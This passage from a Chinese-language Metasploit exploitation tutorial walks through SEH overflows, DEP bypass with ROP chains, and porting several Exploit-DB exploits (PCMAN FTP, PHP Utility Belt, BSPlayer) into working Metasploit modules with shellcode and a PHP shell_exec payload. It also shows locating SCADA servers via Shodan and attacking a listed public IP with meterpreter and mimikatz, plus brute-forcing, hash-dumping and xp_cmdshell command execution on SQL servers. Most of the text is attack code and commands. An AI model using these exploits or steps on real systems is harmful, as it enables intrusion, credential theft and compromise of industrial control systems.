<p>使用方式和之前一样</p>

<pre><code>// 使用自己的EXP
msf&gt; use exploit/windows/MyTestExploit
// 使用Payload
msf exploit(MyTestExploit)&gt; set payload windows/meterpreter/bind_tcp
// 查看EXP参数
msf exploit(MyTestExploit)&gt; show options
// 执行
msf exploit(MyTestExploit)&gt; exploit
</code></pre>

<h2 id="seh溢出">SEH溢出</h2>

<h5 id="什么是seh">什么是SEH</h5>

<p>SEH就是“structured exception handler”缩写，就是当我们写代码时需要进行异常捕获处理的情况，就是try,catch语法。</p>

<p>如果我们复写了 catch 段代码，就可以引起异常来激活我们的shellcode执行了。</p>

<p>其中，SEH模块代码地址的内存布局如下</p>

<pre><code>     ----&gt; 栈内存从低到高 ----&gt;
  | 局部变量 | EBP | 返回地址 | 形参 | 异常程序处理地址 |
</code></pre>

<p>而SEH模块内部的内存布局如下形成单向链表状</p>

<pre><code>     ----&gt; 栈内存从低到高 ----&gt;
  | 下一个SEH记录地址 | 处理程序1的地址 | 下一个SEH记录地址 | 处理程序2的地址 | ...... | 下一个SEH记录地址 | 处理程序3的地址 |
</code></pre>

<p>任何一条SEH记录，前4字节为下一个SEH记录的地址，后4字节为处理程序(也就是catch块)的地址。</p>

<p>因为一个程序允许有多个异常处理程序，所以SEH块之间会形成链表状。</p>

<h5 id="利用seh">利用SEH</h5>

<ol>
<li>使用pattern_crearte生成4000字节的字符队列，然后将其发送到目标处。（TELNET 或 直接填写）</li>
</ol>

<pre><code>root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_crearte.rb 4000 &gt; 4000.txt
</code></pre>

<ol>
<li>然后在immunity调试器中查看该程序栈，可以看到其SE Hanlder的地址被改写，假设改写为 345663E23, 然后我们通过pattern_offset去找精确偏移量</li>
</ol>

<pre><code>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 345663E23 4000

执行可得到其真实偏移量如下
[*] Exact match at offset 3511
</code></pre>

<ol>
<li>然后我们查看SEH模块内部内存分布可知，我们执行两次POP（一次POP操作可使ESP指针+4，两次则+8），即可到达下一个SEH异常处理程序指针，然后我们将这个指针（即ESP+8）的地址替换为跳转到payload的JMP指令的地址，则可执行我们的shellcode。示例如下图：</li>
</ol>

<pre><code>【本图中名词请参见上面的 SEH模块内部的内存布局 这张图】

异常Catch ---调用----&gt;  SEH的处理程序1的地址 （我们修改这个地址为执行 POP/POP/RET 的地址） ---调用---&gt; POP/POP/RET指令（该指令两次POP，会导致ESP+8，ESP当前将指向“下一个SEH记录地址”，RET会使EIP跳转到ESP处） ---调用---&gt; 执行“下一个SEH记录地址”（但该地址我们已经修改为shellcode地址） ---调用---&gt;我们的shellcode
</code></pre>

<ol>
<li>这一步我们来找程序中原本就有的 POP/POP/RET 的地址，以便之后使用。</li>
</ol>

<p>首先我们通过一些反汇编软件，获取我们破解软件中所依赖的dll列表。然后找到没有收到safeSEH保护的dll。（可使用immunity调试器的 <a href="https://github.com/corelan/mona/blob/master/mona.py">MONA插件</a>）</p>

<p>假设我们找到一个不受safeSEH保护的 aaa.dll</p>

<p>我们使用如下工具找到其 POP/POP/RET 指令序列</p>

<pre><code>root@kali:~# msfbinscan -p /aaa.dll

得到 
0x9230bc29 pop ebp; pop ebx; ret
0x9230be8a pop edi; pop esi; ret
</code></pre>

<p>用其中随便一个即可。我们这里将使用0x9230bc29。</p>

<p>于是到这里，我们已经得到了两个核心值，一个是SEH的offset偏移量，一个 POP/POP/RET 的地址。</p>

<h4 id="编写metasploit的seh渗透模块">编写Metasploit的SEH渗透模块</h4>

<pre><code>    require 'msf/core'
    class Metasploit5 &lt; Msf::Exploit::Remote
        Rank = NormalRanking
        include Msf::Exploit::Remote::Tcp
        include Msf::Exploit::Seh
        def initialize(info = {})
            super(update_info(info,
                'Name' =&gt; 'Easy File Sharing HTTP Server 7.2 SEH Overflow (HEAD)',
                'Description' =&gt; 'SEH based overflow example',
                'Platform' =&gt; 'win', // 本模块可适用的平台
                'Author' =&gt; ['FK'],
                'DefaultOptions' =&gt; { 'EXITFUNC' =&gt; 'thread', },
                'Payload' =&gt; {
                    'Space' =&gt; 400,
                    'BadChars' =&gt; &quot;\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e\xff&quot;,
                }
                'Targets' =&gt; [
                    ['HTTP', {'Ret' =&gt; 0x9230bc29, 'Offset' =&gt; 3511}] // POP/POP/RET地址 和 SEH地址偏移
                ],
                'DisclosureDate' =&gt; 'Oct 30 2019' // 漏洞发现时间
            ))
            register_options(
            [
                Opt::RPORT(80)
            ], self.class)
        end
        
        def exploit   // 该函数类似于辅助模块的默认函数run
        // 自己的逻辑代码，例如
            connect
            buf = &quot;HEAD &quot;   // 生成一个恶意头
            buf &lt;&lt; make_nops(target['Offset']) // 填充4091个NOP
            buf &lt;&lt; generate_seh_record(target.ret) // 生成一个8字节指令，前4字节指令负责跳转到payload地址，后4个字节负责跳转到 POP/POP/RET地址
            buf &lt;&lt; make_nops(19) // 无意义，仅防止检测
            buf &lt;&lt; payload.encode
            buf &lt;&lt; &quot; HTTP/1.0\r\n\r\n&quot;
            sock.put(buf)
            handler
            disconnect
        end
    end
</code></pre>

<h4 id="补充-nasm获取操作码">补充：NASM获取操作码</h4>

<p>上面代码中 generate_seh_record() 实际作用是填充了8字节指令，前4字节指令负责跳转到payload地址，后4个字节负责跳转到 POP/POP/RET地址。</p>

<p>这八个字节分别复写情况如下</p>

<pre><code>     ----&gt; 栈内存从低到高 ----&gt;
  | 下一个SEH记录地址 | 处理程序1的地址 | 下一个SEH记录地址 | 处理程序2的地址 | ...... | 下一个SEH记录地址 | 处理程序3的地址 |
  
       ----&gt; 栈内存从低到高 ----&gt;
  | 前四个字节的短跳指令 | POP/POP/RET地址 | 下一个SEH记录地址 | 处理程序2的地址 | ...... | 下一个SEH记录地址 | 处理程序3的地址 |
</code></pre>

<p>这个短跳指令是 \xeb\x0a\x90\x90 ，后面的\x90是进行补齐的，前面的\xeb\x0a是实际的短跳，向后跳转12字节，即汇编码</p>

<pre><code>jmp short 12
</code></pre>

<p>那么我们如何知道汇编码对应的指令操作码呢？这里推荐使用 NASM shell。例如：</p>

<pre><code>root@kali:/usr/share/metasploit-framework/tools/exploit# ./nasm_shell.rb

nasm &gt; jmp short 12
00000000 EB0A    jmp short 0xc
nasm &gt; 
</code></pre>

<p>通过nasm_shell脚本，我们就可以通过命令获取汇编码对应的指令操作码了。</p>

<h2 id="绕过dep">绕过DEP</h2>

<h4 id="dep和rop">DEP和ROP</h4>

<p>数据执行保护（Data Execution Prevention, DEP）是一种将特定内存区域，标记为不可执行的保护机制。</p>

<p>该保护机制将导致我们渗透过程中无法执行shellcode。因为，即使我们修改ESP到shellcode起始地址，并修改EIP使其JMP ESP进行执行。但DEP依然会禁止内存中可写区域（我们的shellcode在这里，也就是ESP所指向位置）的数据执行。此时我们就需要ROP技术。</p>

<p>返回导向编程（Reture Oriented Programming, ROP）技术和之前的修改EIP跳转到ShellCode栈溢出的方法不同。它通过调用ROP指令片段（gadget）,一层一层的跳转到最后的shellcode，而无需执行栈内任何代码。</p>

<p>这样一个一个跳转指令片段，从栈中依次执行，并返回下一个跳转到的地址，最终这个链最终跳转到代码区（不在栈区），调用了一个叫 VirtualProtect 的函数，该函数能够将指定内存区改成可执行状态，相当于破除了DEP的限制。</p>

<p>这就是ROP的原理。</p>

<p>DEP的开启可以在 【控制面板】-&gt; 【系统】-&gt; 【高级】 -&gt; 【性能设置】 -&gt; 【数据执行保护（DEP）】中开启。</p>

<h4 id="查找rop指令片段链">查找ROP指令片段链</h4>

<p>首先，我们可以使用 immunity调试器的 <a href="https://github.com/corelan/mona/blob/master/mona.py">MONA插件</a> 去找到软件所依赖的dll库。</p>

<p>然后使用Metasploit的工具msfrop查找指定指令片段的地址，例如：</p>

<pre><code>root@kali:~# msfrop -v -s &quot;pop ecx&quot; msvcrt.dll

将会得到

[*] gadget with address: 0x6ffdb1d5 matched
0x6ffdb1d5: pop ecx
0x6ffdb1d6: ret

[*] gadget with address: 0x6ffdbd8f matched
0x6ffdbd8f: pop ecx
0x6ffdbd90: ret

...
</code></pre>

<p>如此反复，我们将得到一个ROP片段，然后将其链接起来跳转到 VirtualProtect 即可（Android则是跳转到 mprotect 函数去修改内存读写状态）</p>

<h4 id="mona构建rop链">MONA构建ROP链</h4>

<p>依然使用 immunity调试器的 <a href="https://github.com/corelan/mona">MONA插件</a> ，用它attach到指定进程，然后执行</p>

<pre><code>    !mona rop -m *.dll -cp nonull
</code></pre>

<p>即可在 C:\Program Files\Immunity Inc\Immunity Debugger\ 下即可生成 rop_chains.txt等文件，其中就有VirtualProtect() 函数的ROP链。</p>

<pre><code>    def create_rop_chain()
        rop_gadgets = [
            0x77c1deb4, # POP EAX # RETN [msvcrt.dll]
            0x77be1120, # ptr to &amp;VirtualProtect() [IAT msvcrt.dll]
            ...
            0xffffffff, #
            0x77c29ea4, # INC EBX # RETN 0x04 [msvcrt.dll]
            ...
            0xffffffc0, # Value to negate, will become 0x00000040
            ...
            0x90909090, # nop
            0x77d1cff4, # PUSHAD # RETN [user32.dll]
        ].flatten.pack(&quot;v*&quot;)
        
        return rop_gadgets
    end
</code></pre>

<p><em>值得注意的是，这个ROP链的地址都是绝对地址，在软件重启内存释放情况下就不再有效。我们可以通过特殊方法，寻找到软件基地址，然后通过位置偏移得到这些地址，长期使用。</em></p>

<p><em>上述ROP链可以手动找到并编写，麻烦，但相当可靠。</em></p>

<h4 id="编写metasploit的绕开dep渗透模块">编写Metasploit的绕开DEP渗透模块</h4>

<pre><code>    require 'msf/core'
    class Metasploit5 &lt; Msf::Exploit::Remote
        Rank = NormalRanking
        include Msf::Exploit::Remote::Tcp
        def initialize(info = {})
            super(update_info(info,
                'Name' =&gt; 'DEP bypass Exploit',
                'Description' =&gt; 'DEP bypass Using ROP Chains example',
                'Platform' =&gt; 'win', // 本模块可适用的平台
                'Author' =&gt; ['FK'],
                'Payload' =&gt; {
                    'Space' =&gt; 400,
                    'BadChars' =&gt; &quot;\x00&quot;,
                }
                'Targets' =&gt; [
                    ['HTTP', { 'Offset' =&gt; 3511}] // 溢出地址偏移
                ],
                'DisclosureDate' =&gt; 'Oct 30 2019' // 漏洞发现时间
            ))
            register_options(
            [
                Opt::RPORT(80)
            ], self.class)
        end
        
        def create_rop_chain()
            rop_gadgets = [
                0x77c1deb4, # POP EAX # RETN [msvcrt.dll]
                0x77be1120, # ptr to &amp;VirtualProtect() [IAT msvcrt.dll]
                ...
                0xffffffff, #
                0x77c29ea4, # INC EBX # RETN 0x04 [msvcrt.dll]
                ...
                0xffffffc0, # Value to negate, will become 0x00000040
                ...
                0x90909090, # nop
                0x77d1cff4, # PUSHAD # RETN [user32.dll]
            ].flatten.pack(&quot;v*&quot;)  # pack(&quot;v&quot;), 转为小尾
            
            return rop_gadgets
        end
        
        def exploit   // 该函数类似于辅助模块的默认函数run
        // 自己的逻辑代码，例如
            connect
            rop_chain = create_rop_chain()
            junk = rand_text_alpha_upper(target['Offset'])
            buf = &quot;TRUN .&quot; + junk + rop_chain + make_nops(16) + payload.encoded + '\r\n'
            sock.put(buf)
            handler
            disconnect
        end
    end
</code></pre>

<h2 id="将常见exp移植到metasploit中">将常见Exp移植到Metasploit中</h2>

<p>网上会有各种的EXP，但其代码可能是python，perl，C等，我们可以将其移植到Metasploit中。</p>

<p>当目标机器只有一台的时候，这种移植并没有什么优势，但在对大规模网络进行渗透测试时，这将非常有意义。</p>

<h4 id="移植一个python编写的缓冲区溢出模块exp">移植一个python编写的缓冲区溢出模块EXP</h4>

<p>源码来自 <a href="https://www.exploit-db.com/exploits/31255">Exploit-DB 这里</a></p>

<pre><code>    import socket as s
    from sys import argv
    
    if(len(argv) != 4):
        print &quot;USAGE: %s host &lt;user&gt; &lt;password&gt;&quot; % argv[0]
        exit(1)
    else:
    #store command line arguments
    script,host,fuser,fpass=argv
    #vars
    junk = '\x41' * 2012 #overwrite function (CWD) with garbage/junk chars
    espaddress = '\x59\x06\xbb\x76' # 76BB0659
    nops = '\x90' * 10
    shellcode = ( # BIND SHELL | PORT 4444
        &quot;\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4&quot;
        &quot;\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c&quot;
        &quot;......&quot;
        &quot;......&quot;
        &quot;\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51&quot;
        &quot;\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a\xcd&quot;)
    sploit = junk+espaddress+nops+shellcode
    #create socket
    conn = s.socket(s.AF_INET,s.SOCK_STREAM)
    #establish connection to server
    conn.connect((host,21))
    #post ftp user
    conn.send('USER '+fuser+'\r\n')
    #wait for response
    uf = conn.recv(1024)
    #post ftp password
    conn.send('PASS '+fpass+'\r\n')
    #wait for response
    pf = conn.recv(1024)
    #send ftp command with sploit
    conn.send('CWD '+sploit+'\r\n')
    cf = conn.recv(1024)
    #close connection
    conn.close()
</code></pre>

<p>这个渗透模块采用匿名方式登陆到运行在21端口的 PCMAN FTP2.0， 并利用CWD命令来进行渗透。</p>

<p>其过程包括：</p>

<ol>
<li>将用户名，密码，主机分别保存在 host,fuser,fpass 中</li>
<li>将 junk 分配成 2012个字符&rsquo;A&rsquo;。用来做EIP偏移</li>
<li>将 JMP ESP地址赋值给 espaddress</li>
<li>将 10个 NOP 符号保存到变量 nops中</li>
<li>将攻击载荷丢到shellcode中</li>
<li>使用账密登录目标机FTP</li>
<li>组装，向目标发出 CWD 命令，并将溢出buf通过socket发送给目标机的21端口</li>
<li>执行结束的话，会在目标机弹出一个 windows 的计算器应用程序。证明了该EXP的渗透成功。</li>
</ol>

<p>我们在其中找到核心要点：</p>

<ol>
<li>EIP偏移量 =  2012</li>
<li>JMP ESP地址 =  0x76BB0659</li>
<li>ESP和Shellcode之间的间隔空隙 = 10字节</li>
<li>目标端口 = 21</li>
<li>核心思路 = 发送CWD，后面跟着2012个填充数据，再复写ESP地址为0x76BB0659，填充ESP和Shellcode的间隙10个字节NOP，最后跟上Shellcode实际指令。</li>
</ol>

<p>接下来，我们用Metasploit构建一个同样功能的渗透模块</p>

<pre><code>    require 'msf/core'
    class Metasploit5 &lt; Msf::Exploit::Remote // 继承自远程渗透模块
      Rank = NormalRanking
      include Msf::Exploit::Remote::Ftp // 支持库
      def initialize(info = {})
        super(update_info(info, 
            'Name' =&gt; 'PCMAN FTP server EXP by CWD command',
            'Description' =&gt; 'Test exp module',
            'Platform' =&gt; 'win', // 本模块可适用的平台
            'Author' =&gt; ['FK'],
            'Payload' =&gt; {
                'space' =&gt; 1000, // 攻击载荷shellcode允许的最大空间
                'BadChars' =&gt; '\x00\xff\x0a\x0d\x20\x40', // 可能出现的异常字符
            },
            'DefaultOptions' =&gt; {
                'EXITFUNC' =&gt; 'process',
                'VERBOSE' =&gt; true,
            },
            'Targets' =&gt; [
                ['Windows XP SP2', {'Ret' =&gt; 0x76BB0659, 'Offset' =&gt; 2012}] // JMP ESP地址 和 前置偏移量
            ],
            'DisclosureDate' =&gt; 'Oct 30 2019' // 漏洞发现时间
        ))
        register_options(
            [
                Opt::RPORT(21),
                OptString.new('FTPPASS', [true, 'FTP password', 'FTP account'])
            ],
            self.class
        )
      end
      
      def exploit   // 该函数类似于辅助模块的默认函数run
        // 自己的逻辑代码，例如
        c = connect_login
        return unless c
        sploit = rand_text_alpha(target['Offset'])
        sploit &lt;&lt; [target.ret].pack('V')  // pack['V']，是为了转为小尾
        sploit &lt;&lt; make_npos(10)
        sploit &lt;&lt; payload.encoded
        send_cmd([&quot;CWD &quot; + sploit, false])
        disconnect
      end
      
      def check // 测试函数，在exploit实际渗透之前可以手动调用测试版本信息
        c = connect_login
        disconnect
        if c and banner =~ /220 PCMan's FTP Server 2\.0/
            vprint_status(&quot;OK, 可以渗透&quot;)
            return Exploit::CheckCode::Appears
        elsif not c and banner =~ /220 PCMan's FTP Server 2\.0/
            vprint_status(&quot;账密错误,但版本正确,可以渗透&quot;)
            return Exploit::CheckCode::Appears
        end
        return Exploit::CheckCode::Safe  // 这个版本不存在漏洞
      end
    end
</code></pre>

<p>上面代码和之前相似，不再细说。其中多了一个check()函数，目的是在我们执行渗透之前，调用以便检查，调用方式如下：</p>

<pre><code>    msf exploit(my_exploit)&gt; check

则会输出

[*] OK, 可以渗透

或者其他提示。
</code></pre>

<h4 id="移植一个post请求php-utility-belt模块exp">移植一个POST请求PHP-utility-belt模块EXP</h4>

<p>源码来自 <a href="https://github.com/mboynes/php-utility-belt">这里</a></p>

<p>其漏洞地址在 <a href="https://www.exploit-db.com/exploits/38901">这里</a></p>

<pre><code>POST如下数据即可：

    fwrite(fopen('info.php','w'),'&lt;?php echo phpinfo();?&gt;');
</code></pre>

<p>将其改进，执行shellcode如下</p>

<pre><code>    fwrite(fopen('info.php','w'),'&lt;?php $a=&quot;net user&quot;; echo shell_exec($a)?&gt;');
</code></pre>

<p>命令执行后，将会创建一个info.php文件，并将 net user的信息写入该文件中。然后我们直接在浏览器中浏览 info.php ，即可看到执行命令的结果。</p>

<p>我们需要调用POST，在Metasploit中，WEB相关重要函数可以在/lib/msf/core/exploits/http下的client.rb文件中找到，而GET,POST请求核心函数则可以在/lib/rex/proto/http下的client.rb和client-request.rb文件中找到。</p>

<p>其核心流程包括：</p>

<ol>
<li>创建一个POST请求</li>
<li>利用参数将Payload发送到目标</li>
<li>获取目标的Meterpreter权限</li>
<li>做一些后渗透工作</li>
</ol>

<p>接下来，我们用Metasploit构建一个同样功能的渗透模块</p>

<pre><code>    require 'msf/core'
    class Metasploit5 &lt; Msf::Exploit::Remote // 继承自远程渗透模块
      include Msf::Exploit::Remote::HttpClient // 支持库
      def initialize(info = {})
        super(update_info(info, 
            'Name' =&gt; 'PHP Utility belt remote code Execution',
            'Description' =&gt; 'Test exp module',
            'Platform' =&gt; 'php', // 本模块可适用的平台
            'Author' =&gt; ['FK'],
            'Payload' =&gt; {
                'space' =&gt; 2000, // 攻击载荷shellcode允许的最大空间
                'DisableNops&quot; = true // 是WEB应用不是软件，所以关闭payload中的NOP
            },
            'Targets' =&gt; [
                ['PHP Utility Belt', {}]
            ],
            'DisclosureDate' =&gt; 'Oct 30 2019' // 漏洞发现时间
        ))
        register_options(
            [
                OptString.new('TARGETURI', [true, 'The path to PHP Utility belt', '/php-utility-belt/ajax.php']),
                OptString.new('CHECKURI', [false, 'The path for check', '/php-utility-belt/info.php']),
            ],
            self.class
        )
      end
      
      def check
        send_request_cgi(
            'method' =&gt; 'POST',
            'uri' =&gt; normaliza_uri(target_uri.path),
            'vars_post' =&gt; {
                'code' =&gt; &quot;fwrite(fopen('info.php','w'),'&lt;?php echo phpinfo();?&gt;');&quot;
            }
        )
        resp = send_request_raw({
            'uri' =&gt; normaliza_uri(datastore['CHECKURI']), 
            'method' =&gt; 'GET'
            })
        if resp.body =~ /phpinfo()/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
      end
      
      def exploit
        send_request_cgi(
            'method' =&gt; 'POST',
            'uri' =&gt; normaliza_uri(target_uri.path),
            'vars_post' =&gt; {
                'code' =&gt; payload.encoded
            }
        )
      end
    end
</code></pre>

<p>测试执行EXP</p>

<pre><code>    msf &gt; use exploit/myexp/php-belt
    msf exploit(php-belt)&gt; set RHOST 192.1.1.1
    msf exploit(php-belt)&gt; set payload php/meterpreter/bind_tcp
    msf exploit(php-belt)&gt; check
    [+] 192.1.1.1:80 - The target is valnerable.
    msf exploit(php-belt)&gt; exploit

    ...some infos...

    meterpreter&gt; sysinfo

    ...system infos...
</code></pre>

<h4 id="移植一个tcp请求bsplayer-seh模块exp">移植一个TCP请求BSPlayer SEH模块EXP</h4>

<p>源码来自 <a href="https://www.exploit-db.com/exploits/36477">Exploit-DB 这里</a></p>

<pre><code>    import socket
    import sys
    
    s = socket.socket()         # Create a socket object
    if(len(sys.argv) &lt; 3):
      print &quot;[x] Please enter an IP and port to listen to.&quot;
      print &quot;[x] &quot; + sys.argv[0] + &quot; ip port&quot;
      exit()
    host = sys.argv[1]      # Ip to listen to.
    port = int(sys.argv[2])     # Reserve a port for your service.
    s.bind((host, port))        # Bind to the port
    print &quot;[*] Listening on port &quot; + str(port)
    s.listen(5)                 # Now wait for client connection.
    c, addr = s.accept()        # Establish connection with client.
    # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
    print(('[*] Sending the payload first time', addr))
    c.recv(1024)
    #seh and nseh.
    buf =  &quot;&quot;
    buf += &quot;\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31&quot;
    buf += &quot;\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a&quot;
    buf += &quot;...&quot;
    buf += &quot;\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22&quot;
    buf += &quot;\x8c\xcd\x11\xc2\x37\x12&quot;
    
    jmplong = &quot;\xe9\x85\xe9\xff\xff&quot;
    nseh = &quot;\xeb\xf9\x90\x90&quot;
    # Partially overwriting the seh record (nulls are ignored).
    seh = &quot;\x3b\x58\x00\x00&quot;
    buflen = len(buf)
    response = &quot;\x90&quot; *2048 + buf + &quot;\xcc&quot; * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ &quot;\xcc&quot; * 7000
    c.send(response)
    c.close()
    c, addr = s.accept()        # Establish connection with client.
    # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
    print(('[*] Sending the payload second time', addr))
    c.recv(1024)
    c.send(response)
    c.close()
    s.close()
</code></pre>

<p>上面的代码有三处要值得注意：</p>

<ol>
<li>作者使用了向后跳转的技术找到payload，这是为了解决栈控件限制的技术。</li>
<li>因为漏洞的特性，作者向目标发送了两次恶意缓冲区来执行payload。</li>
<li>这个漏洞执行时，是监听一个端口，然后等待目标连接，到目标连接后，再发送payload过去，并非主动连接目标。</li>
</ol>

<p>我们整理得到的核心信息包括：</p>

<ol>
<li>偏移量 = 2048</li>
<li>POP/POP/RET在内存中的地址 = seh = <code>\x3b\x58\x00\x00</code> = 0x0000583b</li>
<li>到shellcode的长跳转地址 = jmplong = <code>\xe9\x85\xe9\xff\xff</code></li>
<li>指向下一个SEH帧的短跳转指针 = <code>\xeb\xf9\x90\x90</code></li>
</ol>

<p>接下来，我们用Metasploit构建一个同样功能的渗透模块</p>

<pre><code>    require 'msf/core'
    class Metasploit5 &lt; Msf::Exploit::Remote // 继承自远程渗透模块
      Rank = NormalRanking
      include Msf::Exploit::Remote::TcpServer
      def initialize(info = {})
        super(update_info(info, 
            'Name' =&gt; 'BSPlayer SEH overflow exploit',
            'Description' =&gt; 'Test exp module',
            'Platform' =&gt; 'win', // 本模块可适用的平台
            'Author' =&gt; ['FK'],
            'Payload' =&gt; {
                'BadChars' =&gt; &quot;\x00\x0a\x20\x0d&quot;
            },
            'Targets' =&gt; [
                ['Generic', {'Ret' =&gt; 0x0000583b, 'Offset' = 2048}]
            ],
            'DisclosureDate' =&gt; 'Oct 30 2019' // 漏洞发现时间
        ))
      end
      
      def on_client_connect(client) // 这里变化要注意
        return if((p = regenerate_payload(client)) == nil)
        print_status(&quot;Client connected.&quot;)
        sploit = make_nops(target['Offset'])
        sploit &lt;&lt; payload.encoded
        sploit &lt;&lt; &quot;\xcc&quot; * (6787 - 2048 - payload.encoded.length)
        sploit &lt;&lt; &quot;\xe9\x85\xe9\xff\xff&quot;
        sploit &lt;&lt; &quot;\xeb\xf9\x90\x90&quot;
        sploit &lt;&lt; [target.ret].pack('V')
        client.put(sploit)
        client.get_once
        client.put(sploit)
        handler(client)
        service.close_client(client)
      end
    end
</code></pre>

<h2 id="scada渗透">SCADA渗透</h2>

<p>监控和数据采集系统（Supervisory Control and Data Acquisition,
SCADA）一般用于大型工业生产过程控制服务方面。例如交通灯管理，工厂里控制两个药剂的混合比例等等。</p>

<p>最近几年，OT开始和IT进一步整合，而OT原本相对封闭，而且Scada系统通常是基于 windows XP 实现的，所以存在的漏洞隐患较多，成为了HACK们的争相试手之地。</p>

<h4 id="渗透scada服务器">渗透SCADA服务器</h4>

<p>我们利用 shodan 来查找。</p>

<ol>
<li>首先注册一个 shodan 账号，在个人信息处可以找到自己的API KEY</li>
<li>在Metasploit中，利用该key找到合适服务。我们这里尝试找 Rockwell（一个SCADA品牌）的服务器</li>
</ol>

<pre><code>msf&gt; use auxiliary/gather/shodan_search
msf auxiliary(shodan_search)&gt; show options
msf auxiliary(shodan_search)&gt; set SHODAN_APIKEY Rxdskwhhgxbx2djssj21xxoo
msf auxiliary(shodan_search)&gt; set QUERY Rockwell
msf auxiliary(shodan_search)&gt; run

将输出

104.159.239.246:44818  USA
123.209.12.75:44818 Iceland
....
</code></pre>

<ol>
<li>我们对其中一个服务器做一个渗透测试</li>
</ol>

<pre><code>msf&gt; use exploit/windows/scada/realwin_scpc_initialize
msf exploit(realwin_scpc_initialize)&gt; set RHOST 104.159.239.246
msf exploit(realwin_scpc_initialize)&gt; set payload windows/meterpreter/bind_tcp
msf exploit(realwin_scpc_initialize)&gt; exploit
// 然后用mimikatz查看明文mima
meterpreter&gt; load mimikatz
meterpreter&gt; kerberos

将输出

LOCAL SERVICE -
NETWORL SERVICE -
Administrator 12345
</code></pre>

<p>其中Administrator/12345就是账号密码了。</p>

<p>关于SCADA系统的漏洞可以参考 <a href="https://www.scadahacker.com/resources/msf-scada.html">这里</a>，另外， 这个scadahacker网站也是推荐去了解的。</p>

<p>这里不是核心点，简单了解即可。</p>

<h2 id="数据库渗透">数据库渗透</h2>

<h4 id="sql-server">SQL Server</h4>

<p>默认情况下，MS SQL运行在TCP的1433端口以及UDP的1434端口。</p>

<ol>
<li>首先，我们使用NMAP对SQL Server进行踩点。例如：</li>
</ol>

<pre><code>// 扫描TCP端口
msf&gt; db_nmap -sV -p1433 192.1.1.1
msf&gt; services

将得到

192.1.1.1   1433  TCP  MS-SQL  open  MicrosoftSQLServer2008 Version10.0.1600

// 扫描UDP端口
msf&gt; db_nmap -sU -sV -p1434 192.1.1.1
msf&gt; services

将得到

192.1.1.1   1433  TCP  MS-SQL  open  MicrosoftSQLServer2008 Version10.0.1600
192.1.1.1   1434  UDP  MS-SQL  open  MicrosoftSQLServer2008 Version10.0.1600

// 进一步获取数据库基础详细信息
msf&gt; db_nmap -sU --script=ms-sql-info -p1434 192.1.1.1

将得到

MAC Address: 00:50:56:C0:00:0C (VMware)
Windows server name: WIN8
Instance name: MSSQLSERVER
Version: Microsoft SQL Server 2008 RTM
Version number: 10.0.1600.00
Named pipe: \\192.1.1.1\pipe\sql\query
Clustered: No
</code></pre>

<ol>
<li>通过Metasploit进行扫描账密</li>
</ol>

<pre><code>// 获取数据库基础详细信息
msf&gt; use auxiliary/scanner/mssql/mssql_ping
msf auxiliary(mssql_ping)&gt; set RHOSTS 192.1.1.1
msf auxiliary(mssql_ping)&gt; run

可以得到类似上面的 nmap 查询的信息。

// 暴力密码破解
msf&gt; use auxiliary/scanner/mssql/mssql_login
msf auxiliary(mssql_login)&gt; show options // 参数很多，可以看看
msf auxiliary(mssql_login)&gt; set RHOSTS 192.1.1.1
msf auxiliary(mssql_login)&gt; set USER_FILE user.txt // 用户名词典
msf auxiliary(mssql_login)&gt; set PASS_FILE pass.txt // 密码词典
msf auxiliary(mssql_login)&gt; run

然后就可以等待暴力破解结果了。

// 如果获得了一个账密，那么可以将其他的用户密码hash值dump出来
msf&gt; use auxiliary/scanner/mssql/mssql_hashdump
msf auxiliary(mssql_hashdump)&gt; set RHOSTS 192.1.1.1
msf auxiliary(mssql_hashdump)&gt; set USERNAME sa
msf auxiliary(mssql_hashdump)&gt; set PASSWORD test
msf auxiliary(mssql_hashdump)&gt; run

将会得到其他用户名，和密码Hash值，然后可以用第三方工具来破解Hash。以获取权限的提升或者其他库表的权限。

// 这里简单说一种方式
msf&gt; use auxiliary/analyze/jtr_mssql_fast
msf auxiliary(jtr_mssql_fast) &gt; run
</code></pre>

<ol>
<li>通过Metasploit获取库信息</li>
</ol>

<pre><code>msf&gt; use auxiliary/scanner/mssql/mssql_enum
msf auxiliary(mssql_enum)&gt; set RHOSTS 192.1.1.1
msf auxiliary(mssql_enum)&gt; set USERNAME sa
msf auxiliary(mssql_enum)&gt; set PASSWORD test
msf auxiliary(mssql_enum)&gt; run

这样就可以获取数据库几乎所有信息，包括存储过程，库名，账户信息等
</code></pre>

<ol>
<li>后渗透命令</li>
</ol>

<p>为了进行进一步的攻击，我们可以使用两个重要模块。</p>

<ul>
<li>mssql_sql ，可以用它来进行SQL查询</li>
<li>mssql_exec，可以用它来启用被禁止的 xp_cmdshell，以执行系统级命令</li>
</ul>

<pre><code>// 执行系统级命令  ipconfig
msf&gt; use auxiliary/scanner/mssql/mssql_exec
msf auxiliary(mssql_exec)&gt; set CMD 'ipconfig'
msf auxiliary(mssql_exec)&gt; run

// 注入 payload
msf&gt; use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) &gt;set RHOSTS 192.1.1.1
msf exploit(mssql_payload) &gt;set PASSWORD test
msf exploit(mssql_payload) &gt;set SRVHOST 192.1.1.2
msf exploit(mssql_payload) &gt;run
</code></pre>

<h4 id="mysql">MySQL</h4>

<p>类似MS SQL，所以不赘述</p>

<pre><code>// 获取MySQL信息
msf&gt; use auxiliary/scanner/mysql/mysql_version
msf auxiliary(mysql_version)&gt; set RHOSTS 192.1.1.1
msf auxiliary(mysql_version)&gt; run

// 暴力词典破解密码
msf&gt; use auxiliary/scanner/mysql/mysql_login
